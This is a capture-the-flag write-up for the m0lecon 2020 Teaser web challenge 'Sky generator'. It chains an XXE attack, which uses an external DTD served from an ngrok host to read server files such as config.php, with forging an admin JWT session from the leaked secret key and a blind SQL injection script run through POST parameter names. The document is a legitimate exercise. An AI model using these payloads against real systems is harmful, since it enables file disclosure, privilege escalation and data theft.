---
ctf_name: "m0lecon 2020 Teaser"
title:	"Sky generator"
date:	2020-05-24
category: "web"
author: "Maxpnl"
---

### Initial foothold
The website allowed users to transform an xml to a png, containing a sort of constellation, I tried to read /etc/passwd through an xxe payload and it worked, I was a little bit stuck until another member of the team remembered me you can see directories contents, I then looked at /var/www and saw a few juicy php files, one of them was called config.php, the only problem was that a php file contains some characters (e.g. <,  >) which doesn't behave well with xml, therefore I started looking for a way to bypass this limitation, one of them was using CDATA, using it leads the xml parser to avoid trying to interpret the readen file as an xml entity, it sort of sanitizes the readen file. In order to use it I had to create an external dtd file, and serve it using ngrok, the final payload looked something like

(credits to https://dzone.com/articles/xml-external-entity-xxe-limitations)

ngrok.dtd
```
<!ENTITY % file SYSTEM "file:///var/www/html/skygenerator/public/config.php">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>"> 
```

template.xml
```xml
<!DOCTYPE data [
 <!ENTITY % dtd SYSTEM
 "http://ngrokendpoint/ngrok.dtd">
 %dtd;
 %all;
]>
<sky>
	<star x="10" y="10">&fileContents;</star>
</sky>
```

after that I was able to read the config.php file, as well as any other php file without parsing errors.

### Controlling the jwt token
The config.php file had the secret key for the jwt token verification and it was using this plugin to replace the default session handling with jwt https://github.com/byjg/jwt-session.

I took a look at the admin_dashboard.php as well, and it seemed like it was checking for the user role to decide whether a user can access it, this user role was stored inside the session, after seeing this the next steps are pretty straightforward, I installed that jwt session and created a little php script to set the user role inside the session to admin, using the same private key as the server. After that I had a jwt token that was valid for the challenge as well.

```php
<?php

include  "vendor/autoload.php";
$sessionConfig = (new \ByJG\Session\SessionConfig("skygenerator"))
->withSecret("Vb8lckQX8LFPq45Exq5fy2TniLUplKGZXO2")
->withTimeoutMinutes(60);
$handler = new \ByJG\Session\JwtSession($sessionConfig);
session_set_save_handler($handler, true);
session_start();
$_SESSION["id"] = 1846;
$_SESSION["role"] = "admin";
?>
```

### SQL Injection in admin panel
The admin dashboard had a sql injection problem, in addition to the user_id post param it added any extra post param inside the query, the problem is it was doing something like 

```javascript
query = "SELECT ... user_id=:user_id";
foreach ($_POST as $param){
	query .= " AND $param=:param";
}
```

The problem with this code is that $param is not sanitized and it can contain any sql statement, the only problem was that spaces didn't behave well with the :param, the trick was to replace spaces with tabs (\t or %09 url encoded), then I just had to run a typical content-based blind sql injection on the name of the post parameter (not the value) and I got the flag

```python
import requests
def tryshit(query):
    query = query.replace(" ", "\t")
    r = requests.post(
        "https://challs.m0lecon.it:8000/admin_dashboard",
        cookies={"AUTH_BEARER_default": "generated jwt token"},
        data={"user_id": my_user_id, query: 15})
    return r.text


import string

found = ""

while len(found)<100:
    print(found)
    for x in "abcdef" + string.digits:
        dio = tryshit("1=(SELECT 1 FROM flag WHERE hex(flag) LIKE '{}%') -- -".format(found+x))
        if "filesize()" in dio:
            found+=x
            break
```